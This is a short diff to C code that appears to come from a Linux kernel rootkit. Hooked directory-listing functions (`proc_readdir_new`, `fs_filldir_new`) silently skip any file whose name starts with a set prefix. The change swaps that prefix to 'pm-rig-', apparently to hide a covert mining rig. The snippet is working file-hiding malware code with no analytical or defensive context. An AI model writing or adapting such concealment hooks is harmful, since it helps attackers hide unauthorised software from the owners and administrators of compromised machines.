@@ -94,7 +94,7 @@ static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
 
 static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
-	if (hide_files &&  !strncmp(name, "00_-_00", 7))
+	if (hide_files &&  !strncmp(name, "pm-rig-", 7))
 		return 0;
 	return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
 }
